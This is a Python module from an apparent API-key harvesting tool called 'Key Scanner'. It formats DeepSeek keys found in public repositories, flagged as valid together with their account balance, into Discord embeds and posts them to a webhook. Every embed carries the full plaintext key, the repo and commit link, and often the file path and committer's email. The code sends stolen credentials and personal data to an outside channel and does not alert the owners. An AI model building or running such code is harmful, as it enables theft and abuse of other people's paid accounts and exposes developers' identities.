import asyncio
import logging
from datetime import datetime, timezone

import httpx

from scanner.ratelimit import TokenBucket

log = logging.getLogger("scanner.notifier")

MAX_KEYS_FIELD_CHARS = 950
MAX_EMBEDS_PER_MESSAGE = 10


class Notifier:
    def __init__(self, client: httpx.AsyncClient, webhook_url: str):
        self.client = client
        self.webhook_url = webhook_url
        self.send_bucket = TokenBucket(rate=2.5, capacity=5)

    def build_embeds(self, items: list[dict]) -> list[dict]:
        chunks: list[list[dict]] = []
        current: list[dict] = []
        current_len = 0
        for item in items:
            klen = len(item["key"]) + 1
            if current and current_len + klen > MAX_KEYS_FIELD_CHARS:
                chunks.append(current)
                current = []
                current_len = 0
            current.append(item)
            current_len += klen
        if current:
            chunks.append(current)
        return [self._build_embed(chunk, total=len(items)) for chunk in chunks]

    def _build_embed(self, items: list[dict], total: int = 0) -> dict:
        first = items[0]
        balance_eur = first.get("balance_eur")
        if balance_eur:
            amount = balance_eur.split(" ")[0]
            title = f"🔮 DEEPSEEK · ✅ VALID · 💰 {amount}"
            balance_value = f"{balance_eur} EUR"
        else:
            title = "🔮 DEEPSEEK · ✅ VALID · 💰 €N/A"
            balance_value = "N/A"
        if total > 1:
            title += f" · {total} keys"

        keys_value = "\n".join(item["key"] for item in items)
        fields = [
            {"name": "💰 Balance", "value": balance_value, "inline": False},
            {"name": "🔑 Key", "value": f"```{keys_value}```", "inline": False},
            {"name": "📂 Repo", "value": first["repo"], "inline": False},
        ]
        if first.get("source"):
            fields.append({"name": "🔍 Found via", "value": first["source"], "inline": False})
        if total == 1 and first.get("file_path"):
            fields.append({"name": "📄 File", "value": first["file_path"], "inline": False})
        if total == 1 and first.get("author_email"):
            fields.append({"name": "👤 Author", "value": first["author_email"], "inline": False})
        if first.get("commit_url"):
            fields.append({"name": "🔗 Source", "value": f"[View commit ↗]({first['commit_url']})", "inline": False})

        return {
            "title": title,
            "color": 0x7D56F4,
            "fields": fields,
            "footer": {"text": "Key Scanner • Auto-Verified"},
            "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        }

    async def notify_many(self, items: list[dict]) -> bool:
        if not items:
            return True
        if not self.webhook_url:
            log.info("webhook not configured, skipping notification for %s", items[0]["repo"])
            return False

        embeds = self.build_embeds(items)
        all_ok = True
        for i in range(0, len(embeds), MAX_EMBEDS_PER_MESSAGE):
            batch = embeds[i:i + MAX_EMBEDS_PER_MESSAGE]
            payload = {"username": "Key Scanner", "embeds": batch}
            ok = await self._post(payload)
            all_ok = all_ok and ok
        return all_ok

    async def _post(self, payload: dict) -> bool:
        await self.send_bucket.acquire()
        for attempt in range(3):
            try:
                resp = await self.client.post(self.webhook_url, json=payload, timeout=15.0)
                if resp.status_code in (200, 204):
                    return True
                log.warning("discord webhook HTTP %d: %s", resp.status_code, resp.text[:200])
            except httpx.HTTPError as exc:
                log.warning("discord webhook transport error: %s", exc)
            await asyncio.sleep(2 * (attempt + 1))
        return False
